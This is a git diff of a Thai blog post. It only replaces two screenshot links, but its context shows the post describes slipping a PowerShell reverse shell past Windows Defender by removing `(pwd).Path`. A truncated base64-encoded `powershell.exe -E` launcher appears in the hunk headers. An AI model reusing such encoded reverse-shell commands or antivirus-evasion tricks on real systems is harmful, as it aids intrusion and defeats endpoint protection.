@@ -35,7 +35,7 @@ powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAH
 
 เป็นดังภาพครับ
 
-![Antivirus Detected](https://ggez.cc/img/wtf-do-you-want-windows-defender-1.png)
+![Antivirus Detected](https://imgur.com/jwNXteU)
 
 ผมเลยลองพยายามหาว่ามันจับจากอะไรพยายามลบคำสั่งต่าง ๆ ไปเรื่อย ๆ จนท้อ แต่ไม่รู้คิดไงเหมือนกัน ไปลบ `(pwd).Path` ออกจับไม่ได้เฉย Powershell Script ก็จะเป็นประมาณนี้ครับ
 
@@ -81,7 +81,7 @@ powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAH
 
 หลังจากเอาไป Execute ก็ Happy Ending ครับ ดังรูป
 
-![Noob Antivirus](https://ggez.cc/img/wtf-do-you-want-windows-defender-2.png)
+![Noob Antivirus](https://imgur.com/mjG1vlD)
 
 จบเรื่องนี้ผมก็ยังไม่เข้าใจคุณ Windows Defender ว่าเขาต้องการอะไรจากน้อง Reverse Shell ของผม
 
